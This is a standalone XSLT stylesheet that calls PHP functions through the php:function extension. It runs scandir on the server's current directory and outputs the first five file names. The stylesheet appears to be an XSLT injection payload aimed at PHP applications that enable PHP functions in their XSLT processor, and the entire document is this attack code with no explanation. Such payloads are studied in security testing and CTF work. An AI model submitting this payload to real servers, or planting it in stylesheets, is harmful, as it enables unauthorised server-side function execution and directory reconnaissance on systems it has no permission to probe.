<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:variable name="files" select="php:function('scandir', '.')"/>
    <xsl:value-of select="php:function('array_map', 'strval', $files)[1]"/>
    <xsl:text> </xsl:text>
    <xsl:value-of select="php:function('array_map', 'strval', $files)[2]"/>
    <xsl:text> </xsl:text>
    <xsl:value-of select="php:function('array_map', 'strval', $files)[3]"/>
    <xsl:text> </xsl:text>
    <xsl:value-of select="php:function('array_map', 'strval', $files)[4]"/>
    <xsl:text> </xsl:text>
    <xsl:value-of select="php:function('array_map', 'strval', $files)[5]"/>
  </xsl:template>
</xsl:stylesheet>
